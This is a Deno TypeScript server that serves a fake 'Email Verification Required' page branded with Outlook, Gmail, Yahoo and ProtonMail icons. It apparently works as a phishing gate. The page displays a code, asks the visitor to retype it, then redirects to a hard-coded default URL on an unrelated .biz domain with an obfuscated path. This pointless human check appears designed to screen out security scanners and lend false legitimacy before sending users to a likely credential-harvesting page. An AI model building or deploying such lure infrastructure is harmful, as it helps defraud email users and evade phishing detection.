// secure-redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Configuration
const CONFIG = {
  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html",
  VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
  PORT: Deno.env.get("PORT") || "8000"
};

// Professional UI with all icons
function generateHTML() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Access Portal</title>
  <style>
    :root {
      --primary: #2563eb;
      --primary-dark: #1d4ed8;
      --error: #dc2626;
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    }
    body {
      background: linear-gradient(135deg, #1e3a8a 0%, #172554 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 1rem;
    }
    .card {
      background: white;
      border-radius: 1rem;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 480px;
      padding: 2.5rem;
      text-align: center;
    }
    .logo {
      font-size: 1.8rem;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 1.5rem;
    }
    h1 {
      color: #1e293b;
      margin-bottom: 1rem;
      font-size: 1.5rem;
    }
    .code-display {
      background: #f8fafc;
      border: 1px dashed #cbd5e1;
      border-radius: 0.5rem;
      padding: 1.25rem;
      margin: 1.5rem 0;
      font-family: 'Roboto Mono', monospace;
      font-size: 1.5rem;
      letter-spacing: 0.2em;
      color: var(--primary);
      font-weight: 700;
    }
    .form-group {
      margin-bottom: 1.5rem;
      text-align: left;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: #334155;
    }
    input {
      width: 100%;
      padding: 1rem;
      border: 1px solid #e2e8f0;
      border-radius: 0.5rem;
      font-size: 1rem;
      transition: all 0.2s;
    }
    input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }
    button {
      background: var(--primary);
      color: white;
      border: none;
      padding: 1rem;
      border-radius: 0.5rem;
      width: 100%;
      font-size: 1.1rem;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 1rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
    }
    button:hover {
      background: var(--primary-dark);
    }
    .providers {
      display: flex;
      justify-content: center;
      gap: 1.5rem;
      margin: 2rem 0 1rem;
    }
    .provider-icon {
      width: 36px;
      height: 36px;
      transition: transform 0.2s;
    }
    .provider-icon:hover {
      transform: scale(1.1);
    }
    .error {
      color: var(--error);
      margin-top: 1rem;
      display: none;
    }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
  <div class="card">
    <div class="logo">
      <i class="fas fa-shield-alt"></i> SECURE ACCESS
    </div>
    <h1>Email Verification Required</h1>
    <p>Enter the verification code shown below:</p>
    
    <div class="code-display">${CONFIG.VERIFICATION_CODE}</div>
    
    <form id="verifyForm">
      <div class="form-group">
        <label for="codeInput">Verification Code</label>
        <input 
          type="text" 
          id="codeInput" 
          placeholder="Enter the 7-digit code" 
          required
          pattern="[A-Za-z0-9]{7}"
          title="Exactly 7 alphanumeric characters"
        >
      </div>
      <button type="submit">
        <i class="fas fa-lock"></i> VERIFY IDENTITY
      </button>
      <div class="error" id="errorMsg"></div>
    </form>
    
    <div class="providers">
      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/microsoftoutlook.svg" 
           alt="Microsoft Outlook" class="provider-icon" title="Microsoft">
      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/gmail.svg" 
           alt="Gmail" class="provider-icon" title="Google">
      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/yahoo.svg" 
           alt="Yahoo Mail" class="provider-icon" title="Yahoo">
      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/protonmail.svg" 
           alt="ProtonMail" class="provider-icon" title="ProtonMail">
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('verifyForm');
      const input = document.getElementById('codeInput');
      const errorMsg = document.getElementById('errorMsg');
      
      // Auto-focus and select all text
      input.focus();
      input.select();
      
      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        errorMsg.style.display = 'none';
        
        const code = input.value.trim();
        
        try {
          const response = await fetch('/verify', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            body: JSON.stringify({ code })
          });
          
          if (response.redirected) {
            window.location.href = response.url;
          } else {
            const data = await response.json();
            errorMsg.textContent = data.message || 'Verification failed';
            errorMsg.style.display = 'block';
            input.focus();
          }
        } catch (err) {
          errorMsg.textContent = 'Network error. Please check your connection.';
          errorMsg.style.display = 'block';
        }
      });
    });
  </script>
</body>
</html>
`;
}

// Request Handler
async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  
  // Handle verification
  if (url.pathname === "/verify" && req.method === "POST") {
    try {
      const { code } = await req.json();
      
      if (code === CONFIG.VERIFICATION_CODE) {
        return Response.redirect(CONFIG.DESTINATION_URL, 302);
      }
      
      return new Response(
        JSON.stringify({ message: "Invalid verification code" }),
        { status: 401, headers: { "Content-Type": "application/json" } }
      );
      
    } catch (err) {
      return new Response(
        JSON.stringify({ message: "Invalid request format" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }
  }
  
  // Serve verification page
  return new Response(generateHTML(), {
    headers: { "Content-Type": "text/html" }
  });
}

// Start Server
console.log(`Server running on port ${CONFIG.PORT}`);
serve(handleRequest, { port: Number(CONFIG.PORT) });